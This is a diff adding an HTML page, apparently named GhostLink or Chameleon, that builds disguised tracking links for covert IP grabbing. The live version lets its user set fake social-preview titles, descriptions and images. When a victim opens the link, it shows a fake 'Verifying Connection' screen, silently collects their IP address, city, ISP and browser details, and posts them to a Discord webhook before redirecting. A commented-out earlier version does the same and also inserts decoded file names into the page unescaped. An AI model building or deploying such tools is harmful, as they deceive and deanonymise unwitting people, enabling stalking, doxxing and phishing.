@@ -1,0 +1,429 @@
+<!-- <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GhostLink | Tracking & File Bridge</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        .glass { background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(15px); }
+        body { background: #020617; color: #1e293b; min-height: 100vh; font-family: 'Inter', sans-serif; }
+        .tab-active { color: #6366f1; border-bottom: 2px solid #6366f1; }
+        .pulse-red { animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+    </style>
+</head>
+<body class="p-4 flex flex-col items-center">
+
+    <div class="max-w-md w-full mb-6 flex justify-between items-center px-2">
+        <h1 class="text-2xl font-black text-white italic tracking-tighter flex items-center gap-2">
+            <i data-lucide="radar" class="text-indigo-500"></i> GHOSTLINK
+        </h1>
+        <div class="flex gap-2">
+            <div class="bg-red-500/10 px-3 py-1 rounded-full flex items-center gap-2">
+                <div class="w-2 h-2 bg-red-500 rounded-full pulse-red"></div>
+                <span class="text-[10px] font-bold text-red-500">LIVE TRACKING</span>
+            </div>
+        </div>
+    </div>
+
+    <div class="max-w-md w-full glass rounded-2xl flex mb-6 p-1 shadow-xl">
+        <button onclick="switchTab('create')" id="tab-create" class="flex-1 py-3 text-xs font-bold tab-active">CREATE</button>
+        <button onclick="switchTab('vault')" id="tab-vault" class="flex-1 py-3 text-xs font-bold text-slate-400">FILE BRIDGE</button>
+        <button onclick="switchTab('track')" id="tab-track" class="flex-1 py-3 text-xs font-bold text-slate-400">ANALYTICS</button>
+    </div>
+
+    <div id="content-create" class="max-w-md w-full space-y-4">
+        <div class="glass rounded-[2rem] p-6 shadow-2xl border border-white/20">
+            <div class="space-y-4">
+                <div>
+                    <label class="text-[10px] font-bold text-slate-400 ml-1 uppercase">Target URL to Track</label>
+                    <input type="url" id="target-url" placeholder="https://youtube.com/..." class="w-full p-4 rounded-xl bg-slate-100 outline-none focus:ring-2 focus:ring-indigo-500 mt-1">
+                </div>
+                <div>
+                    <label class="text-[10px] font-bold text-slate-400 ml-1 uppercase">Tracking Webhook (Discord/Slack)</label>
+                    <input type="text" id="webhook-url" placeholder="Paste Discord Webhook URL" class="w-full p-4 rounded-xl bg-slate-100 outline-none focus:ring-2 focus:ring-indigo-500 mt-1">
+                </div>
+                <button onclick="generateGhostLink()" class="w-full bg-indigo-600 text-white p-4 rounded-xl font-bold shadow-lg shadow-indigo-500/20 active:scale-95 transition">
+                    GENERATE TRACKING LINK
+                </button>
+            </div>
+        </div>
+
+        <div id="result-area" class="hidden glass rounded-2xl p-4 border border-indigo-100">
+            <p class="text-[10px] font-bold text-indigo-500 uppercase mb-2">Shareable Ghost Link:</p>
+            <div class="flex gap-2">
+                <input type="text" id="final-link" readonly class="flex-1 bg-white p-2 rounded text-xs border" value="">
+                <button onclick="copyLink()" class="bg-slate-900 text-white px-4 rounded-lg"><i data-lucide="copy" class="w-4 h-4"></i></button>
+            </div>
+        </div>
+    </div>
+
+    <div id="content-vault" class="max-w-md w-full hidden space-y-4">
+        <div class="glass rounded-[2rem] p-6 shadow-2xl border border-white/20">
+            <div onclick="document.getElementById('file-input').click()" class="border-2 border-dashed border-slate-200 rounded-3xl p-10 text-center cursor-pointer hover:bg-slate-50">
+                <input type="file" id="file-input" class="hidden" onchange="processFile(event)">
+                <i data-lucide="upload-cloud" class="mx-auto text-indigo-400 w-12 h-12 mb-2"></i>
+                <p class="text-xs font-bold text-slate-500">LINK ANY FILE (IMG, MP3, PDF)</p>
+            </div>
+            <div id="file-status" class="mt-4 hidden">
+                <div class="bg-indigo-50 p-3 rounded-xl flex items-center gap-3">
+                    <i data-lucide="file" class="text-indigo-600"></i>
+                    <div class="flex-1">
+                        <p id="file-name" class="text-[10px] font-bold truncate"></p>
+                        <p id="file-size" class="text-[8px] text-slate-400 font-bold uppercase"></p>
+                    </div>
+                    <button onclick="createFileLink()" class="text-[10px] bg-indigo-600 text-white px-3 py-1 rounded-full font-bold">LINK</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="content-track" class="max-w-md w-full hidden space-y-4">
+        <div class="glass rounded-[2rem] p-6 shadow-2xl border border-white/20">
+            <h3 class="text-xs font-black uppercase text-slate-500 mb-4 flex items-center gap-2">
+                <i data-lucide="activity" class="w-4 h-4 text-red-500"></i> Global Clicks
+            </h3>
+            <div id="log-list" class="space-y-3">
+                <p class="text-center py-10 text-[10px] font-bold text-slate-300 uppercase tracking-widest">No active pings detected</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        lucide.createIcons();
+
+        let currentFileBase64 = "";
+        let currentFileName = "";
+
+        function switchTab(tab) {
+            ['create', 'vault', 'track'].forEach(t => {
+                document.getElementById(`content-${t}`).classList.add('hidden');
+                document.getElementById(`tab-${t}`).classList.remove('tab-active');
+            });
+            document.getElementById(`content-${tab}`).classList.remove('hidden');
+            document.getElementById(`tab-${tab}`).classList.add('tab-active');
+        }
+
+        // --- TRACKING LOGIC ---
+        function generateGhostLink() {
+            const target = document.getElementById('target-url').value;
+            const webhook = document.getElementById('webhook-url').value;
+            if(!target || !webhook) return alert("Fill all fields");
+
+            // In a real app, this would be a URL to a small redirector script
+            // For this HTML-only version, we encode the instructions in the URL fragment
+            const config = btoa(JSON.stringify({t: target, w: webhook}));
+            const final = window.location.href.split('#')[0] + "#track=" + config;
+            
+            document.getElementById('final-link').value = final;
+            document.getElementById('result-area').classList.remove('hidden');
+        }
+
+        // --- FILE BRIDGE LOGIC ---
+        function processFile(e) {
+            const file = e.target.files[0];
+            const reader = new FileReader();
+            reader.onload = (ev) => {
+                currentFileBase64 = ev.target.result;
+                currentFileName = file.name;
+                document.getElementById('file-name').innerText = file.name;
+                document.getElementById('file-size').innerText = (file.size / 1024).toFixed(1) + " KB";
+                document.getElementById('file-status').classList.remove('hidden');
+            };
+            reader.readAsDataURL(file);
+        }
+
+        function createFileLink() {
+            // Converts file into a direct P2P link
+            const final = window.location.href.split('#')[0] + "#file=" + btoa(currentFileName) + "|" + currentFileBase64;
+            document.getElementById('final-link').value = final;
+            document.getElementById('result-area').classList.remove('hidden');
+            switchTab('create');
+        }
+
+        // --- THE "GHOST" ENGINE (Runs on page load) ---
+        async function runEngine() {
+            const hash = window.location.hash;
+            
+            // 1. Check for File Sharing
+            if (hash.startsWith('#file=')) {
+                const data = hash.split('#file=')[1];
+                const [name, b64] = data.split('|');
+                const decodedName = atob(name);
+                document.body.innerHTML = `
+                    <div class="flex flex-col items-center justify-center min-h-screen bg-slate-900 text-white p-6 text-center">
+                        <i data-lucide="file-check" class="w-16 h-16 text-indigo-500 mb-4"></i>
+                        <h1 class="text-xl font-bold">Secure File Received</h1>
+                        <p class="text-sm text-slate-400 mb-6">${decodedName}</p>
+                        <a href="${b64}" download="${decodedName}" class="bg-indigo-600 px-8 py-4 rounded-2xl font-bold shadow-xl">DOWNLOAD FILE</a>
+                    </div>
+                `;
+                lucide.createIcons();
+                return;
+            }
+
+            // 2. Check for Tracking Link
+            if (hash.startsWith('#track=')) {
+                const config = JSON.parse(atob(hash.split('#track=')[1]));
+                
+                // Silent Tracking Ping
+                try {
+                    const ipData = await fetch('https://ipapi.co/json/').then(r => r.json());
+                    const payload = {
+                        content: "🚨 **GHOSTLINK TRIGGERED**",
+                        embeds: [{
+                            title: "Link Opened",
+                            color: 15548997,
+                            fields: [
+                                { name: "Target URL", value: config.t },
+                                { name: "Location", value: `${ipData.city}, ${ipData.country_name}` },
+                                { name: "IP Address", value: ipData.ip },
+                                { name: "Device", value: navigator.userAgent.substring(0, 100) }
+                            ]
+                        }]
+                    };
+                    
+                    await fetch(config.w, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify(payload)
+                    });
+                } catch (e) { console.log("Tracking failed or blocked"); }
+
+                // Immediate Redirect
+                window.location.href = config.t;
+            }
+        }
+
+        function copyLink() {
+            const el = document.getElementById('final-link');
+            el.select();
+            document.execCommand('copy');
+            alert("Link copied to clipboard!");
+        }
+
+        window.onload = runEngine;
+    </script>
+</body>
+</html> -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title id="meta-title-tag">GhostLink | Secure Gateway</title>
+    <meta property="og:title" content="GhostLink | Secure Gateway">
+    <meta property="og:description" content="Encrypted file transfer and link verification.">
+    <meta property="og:image" content="https://images.unsplash.com/photo-1550751827-4bd374c3f58b">
+    <meta name="twitter:card" content="summary_large_image">
+
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        .glass { background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(15px); }
+        body { background: #020617; color: #1e293b; min-height: 100vh; }
+        .input-group:focus-within label { color: #6366f1; }
+    </style>
+</head>
+<body class="p-4 flex flex-col items-center">
+
+    <div id="main-ui" class="max-w-md w-full glass rounded-[2.5rem] shadow-2xl overflow-hidden border border-white/20 mt-6">
+        <div class="bg-gradient-to-br from-indigo-600 to-violet-700 p-8 text-white text-center">
+            <h1 class="text-3xl font-black italic tracking-tighter flex items-center justify-center gap-2">
+                <i data-lucide="ghost"></i> CHAMELEON
+            </h1>
+            <p class="text-indigo-100 text-[10px] font-bold uppercase tracking-[0.3em] mt-2 opacity-80">Metadata Spoof & Tracker</p>
+        </div>
+
+        <div class="p-6 space-y-5">
+            <div class="space-y-2">
+                <label class="text-[10px] font-black text-slate-400 uppercase ml-1">Discord Webhook</label>
+                <input type="text" id="webhook-input" placeholder="Paste Webhook URL" class="w-full p-4 rounded-2xl bg-slate-100 border-none text-xs focus:ring-2 focus:ring-indigo-500 outline-none">
+            </div>
+
+            <div class="space-y-2">
+                <label class="text-[10px] font-black text-slate-400 uppercase ml-1">Real Destination (Redirect)</label>
+                <input type="url" id="dest-url" placeholder="https://real-site.com" class="w-full p-4 rounded-2xl bg-slate-100 border-none text-xs focus:ring-2 focus:ring-indigo-500 outline-none">
+            </div>
+
+            <div class="bg-slate-50 p-4 rounded-[2rem] border border-slate-100 space-y-4">
+                <p class="text-[10px] font-black text-indigo-600 uppercase text-center tracking-widest">Metadata Spoofing (Social Preview)</p>
+                
+                <div class="space-y-2">
+                    <input type="text" id="spoof-title" placeholder="Fake Title (e.g. YouTube Video Name)" class="w-full p-3 rounded-xl bg-white border border-slate-200 text-xs outline-none">
+                    <input type="text" id="spoof-desc" placeholder="Fake Description" class="w-full p-3 rounded-xl bg-white border border-slate-200 text-xs outline-none">
+                    <input type="text" id="spoof-img" placeholder="Fake Image URL (Unsplash/Direct Link)" class="w-full p-3 rounded-xl bg-white border border-slate-200 text-xs outline-none">
+                </div>
+            </div>
+
+            <button onclick="createGhostLink()" class="w-full bg-slate-900 text-white p-4 rounded-2xl font-bold text-sm shadow-xl hover:bg-black transition flex items-center justify-center gap-2">
+                <i data-lucide="share-2" class="w-4 h-4"></i> GENERATE CHAMELEON LINK
+            </button>
+
+            <div id="result-box" class="hidden space-y-2">
+                <div class="flex gap-2">
+                    <input type="text" id="final-link" readonly class="flex-1 bg-indigo-50 p-3 rounded-xl text-[10px] font-mono text-indigo-700 border-none">
+                    <button onclick="copyResult()" class="bg-indigo-600 text-white px-4 rounded-xl"><i data-lucide="copy" class="w-4 h-4"></i></button>
+                </div>
+                <p class="text-[9px] text-slate-400 italic text-center">Note: Preview works best when hosted on a live URL.</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        lucide.createIcons();
+
+        function createGhostLink() {
+            const webhook = document.getElementById('webhook-input').value;
+            const dest = document.getElementById('dest-url').value;
+            const sTitle = document.getElementById('spoof-title').value || "Secure Shared File";
+            const sDesc = document.getElementById('spoof-desc').value || "Click to view content";
+            const sImg = document.getElementById('spoof-img').value || "https://images.unsplash.com/photo-1550751827-4bd374c3f58b";
+
+            if(!webhook || !dest) return alert("Missing Webhook or Destination");
+
+            const config = btoa(JSON.stringify({ 
+                w: webhook, 
+                d: dest, 
+                st: sTitle, 
+                sd: sDesc, 
+                si: sImg 
+            }));
+            
+            const final = window.location.href.split('#')[0] + "#track=" + config;
+            document.getElementById('final-link').value = final;
+            document.getElementById('result-box').classList.remove('hidden');
+        }
+
+        async function runEngine() {
+            const hash = window.location.hash;
+            if (hash.startsWith('#track=')) {
+                const configStr = hash.split('#track=')[1];
+                const config = JSON.parse(atob(configStr));
+
+                // --- 1. APPLY SPOOFED METADATA (For the crawler) ---
+                document.title = config.st;
+                document.querySelector('meta[property="og:title"]').setAttribute("content", config.st);
+                document.querySelector('meta[property="og:description"]').setAttribute("content", config.sd);
+                document.querySelector('meta[property="og:image"]').setAttribute("content", config.si);
+
+                // --- 2. SHOW FAKE LOADING SCREEN ---
+                document.getElementById('main-ui').innerHTML = `
+                    <div class="p-10 text-center space-y-6">
+                        <div class="w-20 h-20 bg-indigo-100 rounded-full flex items-center justify-center mx-auto animate-bounce">
+                            <i data-lucide="shield-check" class="text-indigo-600 w-10 h-10"></i>
+                        </div>
+                        <h2 class="text-lg font-bold text-slate-800">Verifying Connection...</h2>
+                        <p class="text-xs text-slate-400 uppercase tracking-widest animate-pulse">Establishing Secure Tunnel</p>
+                    </div>
+                `;
+                lucide.createIcons();
+
+                // --- 3. HARVEST & LOG ---
+                try {
+                    const ipRes = await fetch('https://ipapi.co/json/');
+                    const ip = await ipRes.json();
+
+                    await fetch(config.w, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            embeds: [{
+                                title: "🎭 Chameleon Link Triggered",
+                                description: `**Target:** ${config.d}\n**Spoof Profile:** ${config.st}`,
+                                color: 3447003,
+                                fields: [
+                                    { name: "IP Address", value: ip.ip, inline: true },
+                                    { name: "Location", value: `${ip.city}, ${ip.region}, ${ip.country_name}`, inline: true },
+                                    { name: "ISP", value: ip.org },
+                                    { name: "User Agent", value: navigator.userAgent }
+                                ],
+                                timestamp: new Date().toISOString()
+                            }]
+                        })
+                    });
+                } catch (e) { console.warn("Tracking failed, proceeding to redirect."); }
+
+                // --- 4. REDIRECT ---
+                setTimeout(() => {
+                    window.location.href = config.d;
+                }, 1500); // 1.5s delay to ensure the webhook completes
+            }
+        }
+
+        function copyResult() {
+            const el = document.getElementById("final-link");
+            el.select();
+            document.execCommand("copy");
+            alert("Chameleon Link Copied!");
+        }
+
+        window.onload = runEngine;
+    </script>
+</body>
+</html>
